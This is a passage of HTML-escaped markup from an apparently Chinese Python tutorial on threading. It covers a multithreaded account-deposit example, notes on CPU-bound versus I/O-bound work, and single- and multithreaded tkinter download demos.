&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;__init__&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;account&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;money&lt;&#x2F;span&gt;&lt;span&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;super&lt;&#x2F;span&gt;&lt;span&gt;().&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;__init__&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.__account=account&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.__money=money&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;run&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.__account.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;yu_e&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.__money)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;main&lt;&#x2F;span&gt;&lt;span&gt;():&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    account=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Account&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    threads=[]&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#创建100个存款的线程向同一个账户存钱&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;range&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;100&lt;&#x2F;span&gt;&lt;span&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        t=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;AddMoneyThread&lt;&#x2F;span&gt;&lt;span&gt;(account,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        threads.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;append&lt;&#x2F;span&gt;&lt;span&gt;(t)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        t.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;start&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;t &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span&gt;threads:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        t.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;join&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;账户的余额为：&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%d&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;元&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;%account.balance)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;__name__==&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;__main__&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;main&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;多进程还是多线程？&lt;&#x2F;p&gt;
&lt;p&gt;单核CPU处理单任务就是等一个任务执行完成之后才执行另一个任务，花费时间比较长。&lt;&#x2F;p&gt;
&lt;p&gt;单核CPU在执行多任务处理的时候，是需要有代价的（比如切换任务的时候需要准备环境），如果任务太多，CPU就会花费大量的时间在任务切换上，从而只有很少的时间来执行任务，这样就会使得系统性能急剧下降，导致所有任务都处理不好。&lt;&#x2F;p&gt;
&lt;p&gt;第二个考虑是否多任务的因素是任务的类型（计算密集型、I&#x2F;O密集型）&lt;&#x2F;p&gt;
&lt;p&gt;计算密集型特点是需要进行大量的计算，消耗CPU的资源。不建议使用多任务，CPU会忙着切换任务，导致执行效率变低。&lt;&#x2F;p&gt;
&lt;p&gt;I&#x2F;O密集型主要涉及到网络、存储介质输入输出的任务。CPU消耗小，任务的大部分时间都是在等待I&#x2F;O操作完成。建议使用多任务，可以减少I&#x2F;O的等待时间。网络应用和web应用都可以看做I&#x2F;O密集型&lt;&#x2F;p&gt;
&lt;p&gt;单线程+异步I&#x2F;O&lt;&#x2F;p&gt;
&lt;p&gt;现在的操作系统都支持使用异步I&#x2F;O来执行单进程单线程的多任务处理，这种模型我们成为事件驱动模型。Nginx就是支持异步I&#x2F;O的web服务器。&lt;&#x2F;p&gt;
&lt;p&gt;例子：将耗时间的任务放到线程中以获得更好的用户体验&lt;&#x2F;p&gt;
&lt;p&gt;单线程实现&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;time&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;tkinter &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#使用Python进行窗口视图设计的模块&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;tkinter.messagebox&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;download&lt;&#x2F;span&gt;&lt;span&gt;():&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#模拟下载任务需要花费10秒&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    time.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;sleep&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    tkinter.messagebox.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;showinfo&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;title&lt;&#x2F;span&gt;&lt;span&gt;=&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;提示&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;message&lt;&#x2F;span&gt;&lt;span&gt;=&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;下载完成！&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;show_about&lt;&#x2F;span&gt;&lt;span&gt;():&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    tkinter.messagebox.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;showinfo&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;title&lt;&#x2F;span&gt;&lt;span&gt;=&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;关于&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;message&lt;&#x2F;span&gt;&lt;span&gt;=&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;pinginglab&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;main&lt;&#x2F;span&gt;&lt;span&gt;(): &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#先设计视窗，然后再定义下载和关于两个按钮&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    top=tkinter.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Tk&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#调用tkinter的Tk接口&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    top.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;title&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;单线程&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    top.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;geometry&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;200x150&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#视窗外部尺寸&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    top.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;wm_attributes&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;-topmost&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;True&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    a=tkinter.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Frame&lt;&#x2F;span&gt;&lt;span&gt;(top)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    button1=tkinter.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Button&lt;&#x2F;span&gt;&lt;span&gt;(a,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;text&lt;&#x2F;span&gt;&lt;span&gt;=&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;下载&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;command&lt;&#x2F;span&gt;&lt;span&gt;=download)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    button1.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;pack&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;side&lt;&#x2F;span&gt;&lt;span&gt;=&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;left&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    button2=tkinter.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Button&lt;&#x2F;span&gt;&lt;span&gt;(a,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;text&lt;&#x2F;span&gt;&lt;span&gt;=&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;关于&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;command&lt;&#x2F;span&gt;&lt;span&gt;=show_about)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    button2.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;pack&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;side&lt;&#x2F;span&gt;&lt;span&gt;=&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;right&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    a.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;pack&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;side&lt;&#x2F;span&gt;&lt;span&gt;=&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;bottom&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    tkinter.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;mainloop&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;__name__==&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;__main__&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;main&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;多线程实现&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;time&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;tkinter &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#使用Python进行窗口视图设计的模块&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;tkinter.messagebox&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;threading &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;Thread&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;main&lt;&#x2F;span&gt;&lt;span&gt;():&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;class &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ebcb8b;&quot;&gt;DownloadTask&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Thread&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;run&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            time.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;sleep&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            tkinter.messagebox.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;showinfo&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;提示&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;,&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;下载完成&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#启用下载按钮&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            button1.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;config&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;state&lt;&#x2F;span&gt;&lt;span&gt;=tkinter.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;NORMAL&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;download&lt;&#x2F;span&gt;&lt;span&gt;():&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#禁用下载按钮&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        button1.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;config&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;state&lt;&#x2F;span&gt;&lt;span&gt;=tkinter.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;DISABLED&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#设通过daemon置守护线程(主程序退出就不再执行),在线程中，处理耗时的下载任务&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;DownloadTask&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;daemon&lt;&#x2F;span&gt;&lt;span&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;True&lt;&#x2F;span&gt;&lt;span&gt;).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;start&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;show_about&lt;&#x2F;span&gt;&lt;span&gt;():&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        tkinter.messagebox.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;showinfo&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;关于&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;,&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;pinginglab&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    top=tkinter.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Tk&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#调用tkinter的Tk接口&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    top.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;title&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;单线程&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    top.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;geometry&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;200x150&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#视窗外部尺寸&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    top.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;wm_attributes&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;-topmost&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;True&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    a=tkinter.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Frame&lt;&#x2F;span&gt;&lt;span&gt;(top)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    a.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;pack&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;side&lt;&#x2F;span&gt;&lt;span&gt;=&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;bottom&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
